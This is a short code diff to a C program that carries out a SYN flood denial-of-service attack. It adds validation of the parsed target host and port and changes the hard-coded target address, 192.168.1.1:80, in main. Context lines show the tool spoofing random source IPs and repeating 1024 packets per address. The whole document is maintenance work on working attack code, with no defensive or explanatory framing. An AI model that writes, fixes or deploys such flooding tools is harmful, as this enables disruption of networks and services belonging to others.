@@ -216,6 +216,11 @@ int SYNFloodAttack(pInput input)
         DisplayError("SYNFloodAttack SplitURL failed");
         return -1;
     }
+    if (strlen(o->host) == 0 || o->port == 0)
+    {
+        DisplayError("SYNFloodAttack SplitURL not right");
+        return -1;
+    }
     // init the target ip and port
     s->dst_ip = (char *)malloc(SYN_FLOOD_IP_BUFFER_SIZE);
     if (!(s->dst_ip))
@@ -284,7 +289,7 @@ int main(void)
     pInput p = (pInput)malloc(sizeof(Input));
     p->random_sip_address = ENABLE_SIP;
     p->each_ip_repeat = 1024;
-    strcpy(p->address, "http://192.168.1.1:80");
+    strcpy(p->address, "192.168.1.1:80");
     SYNFloodAttack(p);
     return 0;
 }
